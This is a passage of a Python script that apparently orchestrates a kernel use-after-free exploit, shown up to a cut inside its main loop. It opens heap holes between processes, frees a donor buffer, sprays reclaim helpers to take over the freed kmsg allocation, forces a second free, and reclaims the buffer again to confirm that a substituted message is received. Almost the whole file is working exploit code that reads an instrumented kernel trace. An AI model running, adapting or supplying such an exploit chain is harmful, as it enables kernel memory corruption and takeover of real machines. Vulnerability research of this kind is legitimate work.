#!/usr/bin/env python3
"""Drive a pre-staged KDI exact-reuse chain through deliberate ASP holes."""

from __future__ import annotations

import argparse
import os
import re
import signal
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path


LABEL_RE = re.compile(
    r"^(\d+) LABEL_(ALLOC|FREE) ptr=0x([0-9a-f]+)"
    r"(?: kind=([^ ]+) pid=(\d+) exec=([^ ]+))?"
)
DESTINATION_RE = re.compile(
    r"^(\d+) DESTINATION_READY seq=(\d+) destination=0x([0-9a-f]+) "
    r".* neighbor0=0x([0-9a-f]+) neighbor1=0x([0-9a-f]+)"
)
READ_RETURN_RE = re.compile(
    r"^(\d+) READ_RETURN seq=(\d+) implementation=([^ ]+) "
    r"destination=0x([0-9a-f]+) rc=0x([0-9a-f]+) "
    r"bytes_read=0x([0-9a-f]+)"
)
DESTINATION_FREE_RE = re.compile(
    r"^(\d+) DESTINATION_FREE_RETURN seq=(\d+) destination=0x([0-9a-f]+)"
)
META_RETURN_RE = re.compile(
    r"^(\d+) META_RETURN seq=(\d+) destination=0x([0-9a-f]+)"
)
TARGET_FREE_RE = re.compile(
    r"^(\d+) TARGET_FREE_RETURN ordinal=1 ptr=0x([0-9a-f]+)"
)
TARGET_KMSG_RECLAIM_RE = re.compile(
    r"^(\d+) TARGET_KMSG_RECLAIM pid=(\d+) ptr=0x([0-9a-f]+)"
)
TARGET_FREE_REPEAT_RETURN_RE = re.compile(
    r"^(\d+) TARGET_FREE_REPEAT_RETURN ordinal=(\d+) ptr=0x([0-9a-f]+)"
)
TARGET_KMSG_USE_RE = re.compile(
    r"^(\d+) TARGET_KMSG_(?:COPYOUT|PUT_TO_USER)_ENTRY "
    r"pid=(\d+) kmsg=0x([0-9a-f]+)"
)
RECV_END_RE = re.compile(
    r"^RECV_END pid=(\d+) kr=0x0 received_size=0x[0-9a-f]+ "
    r"id=0x[0-9a-f]+ marker_matches=(\d+) marker_total=(\d+) "
    r"first_payload=0x([0-9a-f]+)$"
)
PID_RE = re.compile(r"\bpid=(\d+)\b")
CPU_RE = re.compile(r"\bcpu=(\d+)\b")


@dataclass(frozen=True)
class Label:
    pid: int
    kind: str
    executable: str
    timestamp_ns: int


@dataclass(frozen=True)
class Hole:
    lower: int
    lower_pid: int
    upper: int
    upper_pid: int


@dataclass(frozen=True)
class SafeHelper:
    index: int
    helper: int
    attach: int
    stop_cpu: int
    work: Path


@dataclass(frozen=True)
class HolderGroup:
    index: int
    parent: int
    pids: frozenset[int]


@dataclass(frozen=True)
class ActualHelper:
    cpu: int
    helper: int
    attach: int
    work: Path


@dataclass
class ReclaimHolder:
    process: subprocess.Popen[bytes]
    log: Path


def persist(message: str) -> None:
    print(message, flush=True)
    try:
        os.fsync(1)
    except OSError:
        pass


def process_exists(process_id: int) -> bool:
    try:
        os.kill(process_id, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    return True


def retire(*process_ids: int) -> None:
    for process_id in process_ids:
        if process_id <= 0:
            continue
        try:
            os.kill(process_id, signal.SIGTERM)
        except ProcessLookupError:
            pass


def force_retire(*process_ids: int) -> None:
    for process_id in process_ids:
        if process_id <= 0:
            continue
        try:
            os.kill(process_id, signal.SIGKILL)
        except ProcessLookupError:
            pass


def drop_privileges(user_id: int, group_id: int) -> None:
    os.setgroups([])
    os.setgid(group_id)
    os.setuid(user_id)


def append_pid(path: Path, process_id: int) -> None:
    with path.open("a") as pidfile:
        pidfile.write(f"{process_id}\n")
        pidfile.flush()
        os.fsync(pidfile.fileno())


def stop_reclaim_holders(
    holders: dict[int, ReclaimHolder], keep_pid: int = 0
) -> None:
    for process_id, holder in holders.items():
        if process_id == keep_pid or holder.process.poll() is not None:
            continue
        try:
            os.kill(process_id, signal.SIGTERM)
        except ProcessLookupError:
            pass
    deadline = time.monotonic() + 3.0
    for process_id, holder in holders.items():
        if process_id == keep_pid:
            continue
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        try:
            holder.process.wait(timeout=remaining)
        except subprocess.TimeoutExpired:
            pass
    for process_id, holder in holders.items():
        if process_id == keep_pid or holder.process.poll() is not None:
            continue
        try:
            os.kill(process_id, signal.SIGKILL)
        except ProcessLookupError:
            pass


def log_contains(path: Path, needle: str) -> bool:
    try:
        return needle in path.read_text(errors="replace")
    except FileNotFoundError:
        return False


def receive_result(path: Path, process_id: int) -> tuple[int, int, int] | None:
    try:
        lines = path.read_text(errors="replace").splitlines()
    except FileNotFoundError:
        return None
    for line in reversed(lines):
        match = RECV_END_RE.match(line)
        if match is not None and int(match[1]) == process_id:
            return int(match[2]), int(match[3]), int(match[4], 16)
    return None


def parse_pid(line: str) -> int:
    match = PID_RE.search(line)
    return int(match[1]) if match is not None else 0


def parse_cpu(line: str) -> int:
    match = CPU_RE.search(line)
    return int(match[1]) if match is not None else -1


def parse_pidfile(path: Path) -> set[int]:
    return {
        int(line)
        for line in path.read_text(errors="replace").splitlines()
        if line.strip().isdigit()
    }


def parse_holder_groups(values: list[str]) -> list[HolderGroup]:
    groups: list[HolderGroup] = []
    for index, value in enumerate(values):
        pidfile_text, parent_text = value.rsplit(":", 1)
        groups.append(
            HolderGroup(
                index=index,
                parent=int(parent_text),
                pids=frozenset(parse_pidfile(Path(pidfile_text))),
            )
        )
    return groups


def parse_manifest(path: Path) -> list[SafeHelper]:
    helpers: list[SafeHelper] = []
    for line in path.read_text(errors="replace").splitlines():
        fields = dict(field.split("=", 1) for field in line.split())
        helpers.append(
            SafeHelper(
                index=int(fields["index"]),
                helper=int(fields["helper"]),
                attach=int(fields["attach"]),
                stop_cpu=int(fields["stop_cpu"]),
                work=Path(fields["work"]),
            )
        )
    return helpers


def parse_actual_manifest(path: Path) -> list[ActualHelper]:
    helpers: list[ActualHelper] = []
    for line in path.read_text(errors="replace").splitlines():
        fields = dict(field.split("=", 1) for field in line.split())
        cpu = int(fields["cpu"])
        helpers.append(
            ActualHelper(
                cpu=cpu,
                helper=int(fields["helper"]),
                attach=int(fields["attach"]),
                work=Path(fields["work"]),
            )
        )
    return helpers


def apply_label_event(line: str, live: dict[int, Label]) -> tuple[str, int] | None:
    match = LABEL_RE.match(line)
    if match is None:
        return None
    pointer = int(match[3], 16)
    action = match[2]
    if action == "FREE":
        live.pop(pointer, None)
    else:
        live[pointer] = Label(
            pid=int(match[5]),
            kind=match[4],
            executable=match[6],
            timestamp_ns=int(match[1]),
        )
    return action, pointer


def select_cross_group_holes(
    live: dict[int, Label],
    lower_pids: frozenset[int],
    upper_pids: frozenset[int],
    max_holes: int,
) -> list[Hole]:
    candidates: list[Hole] = []
    for lower, lower_label in sorted(live.items()):
        if lower_label.pid not in lower_pids:
            continue
        upper = lower + 0x10
        upper_label = live.get(upper)
        if upper_label is None or upper_label.pid not in upper_pids:
            continue
        if upper_label.pid == lower_label.pid:
            continue
        candidates.append(
            Hole(lower, lower_label.pid, upper, upper_label.pid)
        )

    selected: list[Hole] = []
    used_pids: set[int] = set()
    for hole in candidates:
        if hole.lower_pid in used_pids or hole.upper_pid in used_pids:
            continue
        selected.append(hole)
        used_pids.update((hole.lower_pid, hole.upper_pid))
        if len(selected) >= max_holes:
            break
    return selected


class TraceFollower:
    def __init__(self, path: Path) -> None:
        self.path = path
        self.offset = 0

    def initial_lines(self) -> list[str]:
        with self.path.open("r", errors="replace") as trace:
            lines = trace.readlines()
            self.offset = trace.tell()
        return lines

    def read_new(self) -> list[str]:
        with self.path.open("r", errors="replace") as trace:
            trace.seek(self.offset)
            lines = trace.readlines()
            self.offset = trace.tell()
        return lines


def prepare_kmsg_reclaim_holders(
    args: argparse.Namespace,
) -> dict[int, ReclaimHolder]:
    holders: dict[int, ReclaimHolder] = {}

    args.reclaim_log_dir.mkdir(parents=True, exist_ok=True)
    args.reclaim_pidfile.write_text("")
    try:
        for index in range(1, args.reclaim_count + 1):
            log_path = args.reclaim_log_dir / f"holder-{index:04d}.log"
            with log_path.open("wb") as output:
                process = subprocess.Popen(
                    [
                        str(args.reclaim_helper),
                        "--deferred",
                        hex(args.reclaim_size),
                    ],
                    stdin=subprocess.DEVNULL,
                    stdout=output,
                    stderr=subprocess.STDOUT,
                    cwd=str(args.reclaim_home),
                    close_fds=True,
                    preexec_fn=lambda: drop_privileges(
                        args.reclaim_uid, args.reclaim_gid
                    ),
                )
            holders[process.pid] = ReclaimHolder(process, log_path)
            append_pid(args.reclaim_pidfile, process.pid)

            ready_deadline = time.monotonic() + args.reclaim_ready_timeout
            while time.monotonic() < ready_deadline:
                if log_contains(log_path, "ARMED pid="):
                    break
                if process.poll() is not None:
                    break
                time.sleep(0.002)
            else:
                persist(
                    f"KMSG_RECLAIM_PRESTAGE_TIMEOUT index={index} "
                    f"pid={process.pid} log={log_path}"
                )
                raise SystemExit(20)
            if not log_contains(log_path, "ARMED pid="):
                persist(
                    f"KMSG_RECLAIM_PRESTAGE_FAILED index={index} "
                    f"pid={process.pid} status={process.poll()} log={log_path}"
                )
                raise SystemExit(20)
            if index == 1 or index % 32 == 0:
                persist(
                    f"KMSG_RECLAIM_PRESTAGE_PROGRESS index={index} "
                    f"pid={process.pid}"
                )
        persist(
            f"KMSG_RECLAIM_PRESTAGE_READY count={len(holders)} "
            f"size=0x{args.reclaim_size:x}"
        )
        return holders
    except BaseException:
        stop_reclaim_holders(holders)
        raise


def run_kmsg_reclaim_chain(
    args: argparse.Namespace,
    follower: TraceFollower,
    live: dict[int, Label],
    holders: dict[int, ReclaimHolder],
    post_reclaim_retire_pids: frozenset[int],
) -> None:
    target_pid = 0
    target_log: Path | None = None
    donor_retired = False
    receive_triggered = False
    target_reclaim_timestamp = 0
    repeat_return_timestamp = 0
    repeat_after_reclaim_seen = False

    def consume_trace() -> tuple[int, int, bool, bool]:
        nonlocal target_reclaim_timestamp, repeat_return_timestamp
        nonlocal repeat_after_reclaim_seen
        found_pid = 0
        found_timestamp = 0
        repeat_returned = False
        post_free_use = False
        for trace_line in follower.read_new():
            apply_label_event(trace_line, live)
            if match := TARGET_KMSG_RECLAIM_RE.match(trace_line):
                pointer = int(match[3], 16)
                if pointer == args.donor_buffer:
                    found_pid = int(match[2])
                    found_timestamp = int(match[1])
                    if target_reclaim_timestamp == 0:
                        target_reclaim_timestamp = found_timestamp
            if match := TARGET_FREE_REPEAT_RETURN_RE.match(trace_line):
                pointer = int(match[3], 16)
                if pointer == args.donor_buffer:
                    repeat_timestamp = int(match[1])
                    if (
                        target_reclaim_timestamp
                        and repeat_timestamp > target_reclaim_timestamp
                    ):
                        repeat_after_reclaim_seen = True
                        repeat_returned = True
                        repeat_return_timestamp = repeat_timestamp
                        persist(
                            f"TARGET_FREE_REPEAT_OBSERVED_IN_WATCHER "
                            f"timestamp={repeat_timestamp} "
                            f"ptr=0x{pointer:x} "
                            f"after_reclaim={target_reclaim_timestamp}"
                        )
            if match := TARGET_KMSG_USE_RE.match(trace_line):
                if int(match[2]) == target_pid:
                    post_free_use = True
        return found_pid, found_timestamp, repeat_returned, post_free_use

    try:
        for index, (process_id, holder) in enumerate(holders.items(), 1):
            process = holder.process
            log_path = holder.log
            if process.poll() is not None:
                persist(
                    f"KMSG_RECLAIM_HOLDER_GONE index={index} "
                    f"pid={process_id} status={process.returncode} log={log_path}"
                )
                raise SystemExit(11)
            os.kill(process_id, signal.SIGUSR2)

            ready_deadline = time.monotonic() + args.reclaim_ready_timeout
            ready = False
            while time.monotonic() < ready_deadline:
                found_pid, _, _, _ = consume_trace()
                if found_pid:
                    target_pid = found_pid
                if log_contains(log_path, "READY pid="):
                    ready = True
                    break
                if process.poll() is not None:
                    break
                time.sleep(0.002)
            if not ready:
                persist(
                    f"KMSG_RECLAIM_HOLDER_FAILED index={index} "
                    f"pid={process_id} status={process.poll()} log={log_path}"
                )
                raise SystemExit(11)

            settle_deadline = (
                time.monotonic() + args.reclaim_trace_settle_ms / 1000.0
            )
            while time.monotonic() < settle_deadline:
                found_pid, _, _, _ = consume_trace()
                if found_pid:
                    target_pid = found_pid
                    break
                time.sleep(0.001)

            if index == 1 or index % 16 == 0 or target_pid:
                persist(
                    f"KMSG_RECLAIM_PROGRESS index={index} pid={process_id} "
                    f"target_pid={target_pid}"
                )
            if target_pid:
                target_holder = holders.get(target_pid)
                if target_holder is None:
                    persist(
                        f"KMSG_RECLAIM_PID_MISMATCH target_pid={target_pid} "
                        f"launched={len(holders)}"
                    )
                    raise SystemExit(12)
                target_log = target_holder.log
                break

        if target_pid == 0 or target_log is None:
            persist(
                f"KMSG_RECLAIM_EXHAUSTED count={len(holders)} "
                f"target=0x{args.donor_buffer:x}"
            )
            raise SystemExit(13)

        persist(
            f"KMSG_RECLAIM_EXACT target=0x{args.donor_buffer:x} "
            f"pid={target_pid} holders={len(holders)} log={target_log}"
        )
        if not process_exists(target_pid):
            persist(f"KMSG_RECLAIM_TARGET_GONE pid={target_pid}")
            raise SystemExit(14)
        persist(
            f"KMSG_RECLAIM_ALL_QUEUED kept_pid={target_pid} "
            f"queued={len(holders)}"
        )

        os.sync()
        force_retire(args.donor_child, args.donor_parent)
        donor_retired = True
        persist(
            f"DONOR_FORCE_RETIRED_AFTER_KMSG_RECLAIM ptr=0x{args.donor_buffer:x} "
            f"donor_parent={args.donor_parent} donor_child={args.donor_child} "
            f"kmsg_pid={target_pid}"
        )

        repeat_returned = repeat_after_reclaim_seen
        force_all_deadline = time.monotonic() + 5.0
        all_participants_forced = False
        repeat_deadline = time.monotonic() + args.repeat_free_timeout
        while time.monotonic() < repeat_deadline:
            _, _, observed_return, _ = consume_trace()
            if observed_return:
                repeat_returned = True
                break
            if (
                not all_participants_forced
                and time.monotonic() >= force_all_deadline
            ):
                force_retire(*post_reclaim_retire_pids)
                all_participants_forced = True
                persist(
                    f"CHAIN_PARTICIPANTS_FORCE_RETIRED count={len(post_reclaim_retire_pids)} "
                    f"target_kmsg_pid={target_pid}"
                )
            if not process_exists(target_pid):
                break
            time.sleep(0.001)
        persist(
            f"DONOR_SECOND_FREE_STATUS ptr=0x{args.donor_buffer:x} "
            f"returned={int(repeat_returned)} kmsg_pid={target_pid}"
        )

        if not repeat_returned:
            if process_exists(target_pid):
                os.kill(target_pid, signal.SIGUSR1)
                receive_triggered = True
                persist(
                    f"KMSG_DRAINED_WITHOUT_SECOND_FREE pid={target_pid} "
                    f"ptr=0x{args.donor_buffer:x}"
                )
            raise SystemExit(19)

        replacement_sequence = 0
        replacement_marker = 0
        second_reclaim_timestamp = 0
        persist(
            f"KMSG_SECOND_RECLAIM_BEGIN pid={target_pid} "
            f"ptr=0x{args.donor_buffer:x} "
            f"after_repeat={repeat_return_timestamp} "
            f"attempts={args.replacement_attempts}"
        )
        consume_trace()
        for sequence in range(1, args.replacement_attempts + 1):
            if not process_exists(target_pid):
                persist(
                    f"KMSG_REPLACEMENT_TARGET_GONE pid={target_pid} "
                    f"sequence={sequence}"
                )
                break

            os.kill(target_pid, signal.SIGHUP)
            ready_needle = (
                f"REPLACEMENT_READY pid={target_pid} seq={sequence} "
            )
            ready_deadline = time.monotonic() + args.reclaim_ready_timeout
            replacement_ready = False
            candidate_timestamp = 0
            while time.monotonic() < ready_deadline:
                found_pid, found_timestamp, _, _ = consume_trace()
                if found_timestamp > repeat_return_timestamp:
                    if found_pid == target_pid:
                        candidate_timestamp = found_timestamp
                    else:
                        persist(
                            f"KMSG_SECOND_RECLAIM_OTHER_PID "
                            f"pid={found_pid} ptr=0x{args.donor_buffer:x} "
                            f"timestamp={found_timestamp} "
                            f"replacement_sequence={sequence}"
                        )
                if log_contains(target_log, ready_needle):
                    replacement_ready = True
                    break
                if not process_exists(target_pid):
                    break
                time.sleep(0.001)
            if not replacement_ready:
                persist(
                    f"KMSG_REPLACEMENT_SEND_FAILED pid={target_pid} "
                    f"sequence={sequence} log={target_log}"
                )
                break

            settle_deadline = time.monotonic() + max(
                args.reclaim_trace_settle_ms, 50.0
            ) / 1000.0
            while time.monotonic() < settle_deadline:
                found_pid, found_timestamp, _, _ = consume_trace()
                if (
                    found_pid == target_pid
                    and found_timestamp > repeat_return_timestamp
                ):
                    candidate_timestamp = found_timestamp
                    break
                time.sleep(0.001)

            if sequence == 1 or sequence % 16 == 0 or candidate_timestamp:
                persist(
                    f"KMSG_REPLACEMENT_PROGRESS pid={target_pid} "
                    f"sequence={sequence} exact={int(bool(candidate_timestamp))}"
                )
            if candidate_timestamp:
                replacement_sequence = sequence
                replacement_marker = 0x52504C4700000000 | sequence
                second_reclaim_timestamp = candidate_timestamp
                persist(
                    f"KMSG_SECOND_RECLAIM_EXACT pid={target_pid} "
                    f"ptr=0x{args.donor_buffer:x} "
                    f"timestamp={second_reclaim_timestamp} "
                    f"after_repeat={repeat_return_timestamp} "
                    f"replacement_sequence={replacement_sequence} "
                    f"replacement_marker=0x{replacement_marker:x}"
                )
                break

        if second_reclaim_timestamp == 0:
            persist(
                f"KMSG_SECOND_RECLAIM_EXHAUSTED pid={target_pid} "
                f"ptr=0x{args.donor_buffer:x} "
                f"attempts={args.replacement_attempts}"
            )

        if process_exists(target_pid):
            persist(
                f"POST_FREE_KMSG_RECEIVE_ARMED pid={target_pid} "
                f"ptr=0x{args.donor_buffer:x} "
                f"repeat_returned={int(repeat_returned)} "
                f"second_reclaim={int(bool(second_reclaim_timestamp))} "
                f"replacement_sequence={replacement_sequence} "
                f"replacement_marker=0x{replacement_marker:x}"
            )
            os.sync()
            time.sleep(0.25)
            os.kill(target_pid, signal.SIGUSR1)
            receive_triggered = True
            persist(
                f"POST_FREE_KMSG_RECEIVE_TRIGGERED pid={target_pid} "
                f"ptr=0x{args.donor_buffer:x} "
                f"repeat_returned={int(repeat_returned)} "
                f"second_reclaim={int(bool(second_reclaim_timestamp))}"
            )
        else:
            persist(
                f"POST_FREE_KMSG_TARGET_EXITED pid={target_pid} "
                f"repeat_returned={int(repeat_returned)}"
            )
            raise SystemExit(15)

        observed_use = False
        receive_succeeded = False
        received_markers: tuple[int, int, int] | None = None
        use_deadline = time.monotonic() + args.post_chain_seconds
        while time.monotonic() < use_deadline:
            _, _, _, trace_use = consume_trace()
            observed_use = observed_use or trace_use
            received_markers = receive_result(target_log, target_pid)
            receive_succeeded = received_markers is not None
            if receive_succeeded or (
                observed_use and second_reclaim_timestamp == 0
            ):
                break
            if not process_exists(target_pid):
                break
            time.sleep(0.001)

        if (
            second_reclaim_timestamp
            and received_markers is not None
            and received_markers[0] == 0
            and received_markers[1] > 0
            and received_markers[2] == replacement_marker
        ):
            persist(
                f"UAF_KMSG_CROSS_MESSAGE_SUBSTITUTION_CONFIRMED "
                f"pid={target_pid} ptr=0x{args.donor_buffer:x} "
                f"second_reclaim_timestamp={second_reclaim_timestamp} "
                f"replacement_sequence={replacement_sequence} "
                f"replacement_marker=0x{replacement_marker:x} "
                f"marker_matches={received_markers[0]} "
                f"marker_total={received_markers[1]} "
                f"first_payload=0x{received_markers[2]:x}"
            )
            os.sync()
            return

        if second_reclaim_timestamp and received_markers is not None:
            persist(
                f"KMSG_SECOND_RECLAIM_RECEIVE_MISMATCH pid={target_pid} "
                f"ptr=0x{args.donor_buffer:x} "
                f"expected=0x{replacement_marker:x} "
                f"marker_matches={received_markers[0]} "
                f"marker_total={received_markers[1]} "
                f"first_payload=0x{received_markers[2]:x}"
            )

        if repeat_returned and (observed_use or receive_succeeded):
            persist(
                f"UAF_KMSG_POST_FREE_USE_CONFIRMED pid={target_pid} "
                f"ptr=0x{args.donor_buffer:x} "
                f"repeat_returned={int(repeat_returned)} "
                f"second_reclaim={int(bool(second_reclaim_timestamp))} "
                f"trace_use={int(observed_use)} "
                f"receive_success={int(receive_succeeded)}"
            )
            os.sync()
            return

        persist(
            f"POST_FREE_KMSG_USE_TIMEOUT pid={target_pid} "
            f"ptr=0x{args.donor_buffer:x} "
            f"repeat_returned={int(repeat_returned)} "
            f"seconds={args.post_chain_seconds:g}"
        )
        raise SystemExit(16)
    finally:
        if not donor_retired:
            stop_reclaim_holders(holders)
        elif receive_triggered and target_pid:
            target_holder = holders.get(target_pid)
            if target_holder is not None and target_holder.process.poll() is not None:
                persist(
                    f"KMSG_RECLAIM_TARGET_EXIT_STATUS pid={target_pid} "
                    f"status={target_holder.process.returncode}"
                )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("trace_log", type=Path)
    parser.add_argument("safe_manifest", type=Path)
    parser.add_argument("actual_manifest", type=Path)
    parser.add_argument("donor_parent", type=int)
    parser.add_argument("donor_child", type=int)
    parser.add_argument("--donor-object", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--donor-buffer", type=lambda value: int(value, 0), required=True)
    parser.add_argument(
        "--holder-group",
        action="append",
        required=True,
        help="PIDFILE:PARENT_PID for one independently retired holder group",
    )
    parser.add_argument("--max-holes", type=int, default=128)
    parser.add_argument("--min-open-holes", type=int, default=8)
    parser.add_argument("--start-open-holes", type=int, default=32)
    parser.add_argument("--hole-timeout", type=float, default=8.0)
    parser.add_argument("--safe-timeout", type=float, default=8.0)
    parser.add_argument("--target-timeout", type=float, default=20.0)
    parser.add_argument("--free-settle-ms", type=float, default=2.0)
    parser.add_argument(
        "--require-staged-cpu-match",
        action="store_true",
        help="skip safe candidates unless a live actual helper is staged on the free CPU",
    )
    parser.add_argument(
        "--candidate-cpu-warmup",
        type=int,
        default=1,
        help="require viable safe-candidate frees on this many distinct CPUs before launch",
    )
    parser.add_argument(
        "--max-actual-attempts",
        type=int,
        default=1,
        help="maximum sequential malformed reads after one safe candidate",
    )
    parser.add_argument("--post-chain-seconds", type=float, default=60.0)
    parser.add_argument("--reclaim-helper", type=Path, required=True)
    parser.add_argument("--reclaim-pidfile", type=Path, required=True)
    parser.add_argument("--reclaim-log-dir", type=Path, required=True)
    parser.add_argument("--reclaim-home", type=Path, default=Path("/Users/testtest"))
    parser.add_argument("--reclaim-count", type=int, default=192)
    parser.add_argument(
        "--reclaim-size", type=lambda value: int(value, 0), default=0x3D4
    )
    parser.add_argument("--reclaim-uid", type=int, default=501)
    parser.add_argument("--reclaim-gid", type=int, default=20)
    parser.add_argument("--reclaim-ready-timeout", type=float, default=2.0)
    parser.add_argument("--reclaim-trace-settle-ms", type=float, default=10.0)
    parser.add_argument("--repeat-free-timeout", type=float, default=20.0)
    parser.add_argument("--replacement-attempts", type=int, default=128)
    parser.add_argument("--start-file", type=Path)
    parser.add_argument("--start-timeout", type=float, default=120.0)
    args = parser.parse_args()

    if args.reclaim_count < 1 or args.reclaim_count > 512:
        parser.error("--reclaim-count must be in 1..512")
    if args.reclaim_size < 0x100 or args.reclaim_size > 0x4000:
        parser.error("--reclaim-size must be in 0x100..0x4000")
    if args.replacement_attempts < 1 or args.replacement_attempts > 512:
        parser.error("--replacement-attempts must be in 1..512")
    if args.candidate_cpu_warmup < 1 or args.candidate_cpu_warmup > 4:
        parser.error("--candidate-cpu-warmup must be in 1..4")
    if args.max_actual_attempts < 1 or args.max_actual_attempts > 4:
        parser.error("--max-actual-attempts must be in 1..4")

    reclaim_holders = prepare_kmsg_reclaim_holders(args)

    if args.start_file is not None:
        persist(f"START_BARRIER_WAIT path={args.start_file}")
        start_deadline = time.monotonic() + args.start_timeout
        while not args.start_file.exists():
            if time.monotonic() >= start_deadline:
                persist(
                    f"START_BARRIER_TIMEOUT path={args.start_file} "
                    f"seconds={args.start_timeout:g}"
                )
                raise SystemExit(17)
            time.sleep(0.001)
        persist(f"START_BARRIER_RELEASED path={args.start_file}")

    follower = TraceFollower(args.trace_log)
    live: dict[int, Label] = {}
    for line in follower.initial_lines():
        apply_label_event(line, live)

    holder_groups = parse_holder_groups(args.holder_group)
    if len(holder_groups) != 2:
        raise ValueError("exactly two holder groups are required")
    first_orientation = select_cross_group_holes(
        live,
        holder_groups[0].pids,
        holder_groups[1].pids,
        args.max_holes,
    )
    second_orientation = select_cross_group_holes(
        live,
        holder_groups[1].pids,
        holder_groups[0].pids,
        args.max_holes,
    )
    if len(second_orientation) > len(first_orientation):
        lower_group, upper_group = holder_groups[1], holder_groups[0]
        holes = second_orientation
    else:
        lower_group, upper_group = holder_groups[0], holder_groups[1]
        holes = first_orientation
    holder_count = sum(len(group.pids) for group in holder_groups)
    actual_helpers = parse_actual_manifest(args.actual_manifest)
    safe_helpers = parse_manifest(args.safe_manifest)
    safe_helpers.sort(key=lambda helper: helper.index)
    post_reclaim_retire_pids: set[int] = {
        args.donor_parent,
        args.donor_child,
    }
    for helper in safe_helpers:
        post_reclaim_retire_pids.update((helper.helper, helper.attach))
    for helper in actual_helpers:
        post_reclaim_retire_pids.update((helper.helper, helper.attach))
    for group in holder_groups:
        post_reclaim_retire_pids.update(group.pids)
        post_reclaim_retire_pids.add(group.parent)
    post_reclaim_retire_pids.discard(0)
    frozen_post_reclaim_retire_pids = frozenset(post_reclaim_retire_pids)
    if len(holes) < args.min_open_holes:
        persist(
            f"INSUFFICIENT_ADJACENT_PAIRS selected={len(holes)} "
            f"minimum={args.min_open_holes} holders={holder_count} live={len(live)} "
            f"first_orientation={len(first_orientation)} "
            f"second_orientation={len(second_orientation)}"
        )
        raise SystemExit(6)

    persist(
        f"HOLE_PLAN_READY selected={len(holes)} holders={holder_count} "
        f"safe_helpers={len(safe_helpers)} actual_helpers={len(actual_helpers)}"
    )
    persist(
        "ACTUAL_POOL "
        + " ".join(
            f"member{index}=cpu{helper.cpu}:pid{helper.helper}"
            for index, helper in enumerate(actual_helpers, 1)
        )
    )
    persist(
        f"HOLE_ORIENTATION lower_group={lower_group.index} "
        f"lower_parent={lower_group.parent} lower_count={len(lower_group.pids)} "
        f"upper_group={upper_group.index} upper_parent={upper_group.parent} "
        f"upper_count={len(upper_group.pids)} "
        f"first_orientation={len(first_orientation)} "
        f"second_orientation={len(second_orientation)}"
    )
    for hole in holes:
        persist(
            f"HOLE_PLAN lower=0x{hole.lower:x} lower_pid={hole.lower_pid} "
            f"upper=0x{hole.upper:x} upper_pid={hole.upper_pid}"
        )

    hole_by_lower = {hole.lower: hole for hole in holes}
    hole_by_upper = {hole.upper: hole for hole in holes}
    opened: set[int] = set()
    retire(*lower_group.pids, lower_group.parent)
    persist(
        f"LOWER_GROUP_RETIRE_REQUESTED group={lower_group.index} "
        f"parent={lower_group.parent} count={len(lower_group.pids)} "
        f"planned_holes={len(holes)}"
    )

    deadline = time.monotonic() + args.hole_timeout
    quiet_deadline = deadline
    while time.monotonic() < deadline:
        lines = follower.read_new()
        if not lines:
            if len(opened) >= args.start_open_holes and time.monotonic() >= quiet_deadline:
                break
            time.sleep(0.001)
            continue
        for line in lines:
            event = apply_label_event(line, live)
            if event is None:
                continue
            action, pointer = event
            if action == "FREE" and pointer in hole_by_lower and pointer not in opened:
                opened.add(pointer)
                quiet_deadline = time.monotonic() + 0.2
                hole = hole_by_lower[pointer]
                persist(
                    f"HOLE_OPENED lower=0x{pointer:x} lower_pid={hole.lower_pid} "
                    f"upper=0x{hole.upper:x} upper_pid={hole.upper_pid} "
                    f"opened={len(opened)}"
                )

    valid: dict[int, Hole] = {}
    for lower in opened:
        hole = hole_by_lower[lower]
        upper_label = live.get(hole.upper)
        if (
            upper_label is not None
            and upper_label.pid == hole.upper_pid
            and process_exists(hole.upper_pid)
        ):
            valid[lower] = hole
    persist(
        f"HOLES_READY requested={len(holes)} opened={len(opened)} "
        f"valid={len(valid)}"
    )
    if len(valid) < args.min_open_holes:
        persist(
            f"INSUFFICIENT_OPEN_HOLES valid={len(valid)} "
            f"minimum={args.min_open_holes}"
        )
        raise SystemExit(7)

    expected_destination = 0
    safe_sequence = 0
    upper_pid = 0
    actual_verified = False
    upper_retired = False
    target_deadline: float | None = None
    actual_pending: list[ActualHelper] = []
    awaiting_actual: ActualHelper | None = None
    actual_by_sequence: dict[int, tuple[ActualHelper, int]] = {}
    actual_returns: set[int] = set()
    exact_sequence = 0
    actual_started = False
    candidate_free_cpus: set[int] = set()

    def launch_next_actual() -> None:
        nonlocal awaiting_actual
        if not actual_pending:
            return
        awaiting_actual = actual_pending.pop(0)
        os.kill(awaiting_actual.helper, signal.SIGCONT)
        persist(
            f"ACTUAL_RACE_RESUMED helper={awaiting_actual.helper} "
            f"staged_cpu={awaiting_actual.cpu} remaining={len(actual_pending)}"
        )

    for helper in safe_helpers:
        if not process_exists(helper.helper):
            persist(
                f"SAFE_HELPER_GONE index={helper.index} helper={helper.helper}"
            )
            continue
        persist(
            f"SAFE_RESUME index={helper.index} helper={helper.helper} "
            f"attach={helper.attach} stop_cpu={helper.stop_cpu}"
        )
        os.kill(helper.helper, signal.SIGCONT)
        helper_deadline = time.monotonic() + args.safe_timeout
        helper_returned = False

        while time.monotonic() < (target_deadline or helper_deadline):
            lines = follower.read_new()
            if not lines:
                time.sleep(0.001)
                continue
            for line in lines:
                apply_label_event(line, live)
                event_pid = parse_pid(line)

                if match := DESTINATION_RE.match(line):
                    sequence = int(match[2])
                    destination = int(match[3], 16)
                    neighbor0 = int(match[4], 16)
                    neighbor1 = int(match[5], 16)
                    if event_pid in (0, helper.helper) and safe_sequence == 0:
                        hole = valid.get(destination)
                        upper_label = (
                            live.get(hole.upper) if hole is not None else None
                        )
                        persist(
                            f"SAFE_DESTINATION index={helper.index} seq={sequence} "
                            f"destination=0x{destination:x} cpu={parse_cpu(line)} "
                            f"planned_hole={int(hole is not None)} "
                            f"neighbor0=0x{neighbor0:x} neighbor1=0x{neighbor1:x}"
                        )
                        if (
                            hole is not None
                            and upper_label is not None
                            and upper_label.pid == hole.upper_pid
                            and process_exists(hole.upper_pid)
                        ):
                            safe_sequence = sequence
                            expected_destination = destination
                            upper_pid = hole.upper_pid
                            persist(
                                f"SAFE_CANDIDATE index={helper.index} seq={sequence} "
                                f"destination=0x{destination:x} "
                                f"upper=0x{hole.upper:x} upper_pid={upper_pid}"
                            )
